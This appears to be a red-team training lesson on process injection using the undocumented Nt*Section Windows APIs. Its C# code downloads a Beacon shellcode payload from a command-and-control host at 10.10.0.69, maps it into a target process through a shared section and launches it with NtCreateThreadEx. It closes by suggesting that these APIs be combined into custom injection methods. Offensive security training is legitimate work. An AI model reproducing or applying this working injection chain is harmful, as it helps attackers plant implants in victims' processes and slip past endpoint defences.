The Nt*Section set of APIs provides a nice alternative to VirtualAllocEx, WriteProcessMemory and VirtualProtectEx.  The big challenge with using these lower-level native APIs is that they're not officially documented, so we must rely on the efforts of individuals who perform reverse engineering on ntdll.dll to figure them out.  One such resource is [ntinternals.net](http://undocumented.ntinternals.net/index.html).

1.  Fetch the shellcode and create a new section within our current process.  The section has to be as large as the shellcode size.

```csharp
var shellcode = await client.GetByteArrayAsync("https://10.10.0.69/beacon.bin");

var hSection = IntPtr.Zero;
var maxSize = (ulong)shellcode.Length;

// Create a new section in the current process
Native.NtCreateSection(
    ref hSection,
    0x10000000,     // SECTION_ALL_ACCESS
    IntPtr.Zero,
    ref maxSize,
    0x40,           // PAGE_EXECUTE_READWRITE
    0x08000000,     // SEC_COMMIT
    IntPtr.Zero);
```

  

2.  Map the view of that section into memory of the current process.

```csharp
// Map that section into memory of the current process as RW
Native.NtMapViewOfSection(
    hSection,
    (IntPtr)(-1),   // will target the current process
    out var localBaseAddress,
    IntPtr.Zero,
    IntPtr.Zero,
    IntPtr.Zero,
    out var _,
    2,              // ViewUnmap (created view will not be inherited by child processes)
    0,
    0x04);          // PAGE_READWRITE

// Copy shellcode into memory of our own process
Marshal.Copy(shellcode, 0, localBaseAddress, shellcode.Length);
```

  

3.  Get a handle to the target process and map the same section into it.  This will automatically copy the shellcode from our current process to the target.

```csharp
// Get reference to target process
var target = Process.GetProcessById(4148);

// Now map this region into the target process as RX
Native.NtMapViewOfSection(
    hSection,
    target.Handle,
    out var remoteBaseAddress,
    IntPtr.Zero,
    IntPtr.Zero,
    IntPtr.Zero,
    out _,
    2,
    0,
    0x20);      // PAGE_EXECUTE_READ
```

  

4.  Create a new remote thread to execute the shellcode.

```csharp
// Shellcode is now in the target process, execute it (fingers crossed)
Native.NtCreateThreadEx(
    out _,
    0x001F0000, // STANDARD_RIGHTS_ALL
    IntPtr.Zero,
    target.Handle,
    remoteBaseAddress,
    IntPtr.Zero,
    false,
    0,
    0,
    0,
    IntPtr.Zero);
```

  

You should now have a Beacon running in the target process.

  

![](https://rto2-assets.s3.eu-west-2.amazonaws.com/process-injection/ntmapviewofsection/beacon.png)

  

  Think of all the APIs we've covered like items on a menu.  You can mix and match them to create your own style of injection.  For instance, you could spawn a process in a suspended state, use the Nt*Section APIs to map and copy the shellcode, and then QueueUserAPC or NtQueueApcThread to execute it.